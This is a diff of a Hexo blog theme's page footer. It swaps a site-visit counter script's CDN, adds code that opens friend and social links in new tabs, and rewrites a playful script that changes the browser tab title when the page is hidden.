-            </div>
-            <time class="flex-col time">{date}</time>
-        </div>
-    </a>
-</li>
-</template>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
-
-
-
-
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
 <script>
-(function() {
-    var OriginTitile = document.title, titleTime;
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-            document.title = '死鬼去哪里了！';
-            clearTimeout(titleTime);
-        } else {
-            document.title = '(つェ⊂)咦!又好了!';
-            titleTime = setTimeout(function() {
-                document.title = OriginTitile;
-            },2000);
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+            
+            
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
         }
-    });
-})();
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
 </script>
 
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
 
-
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
 </body>
 </html>
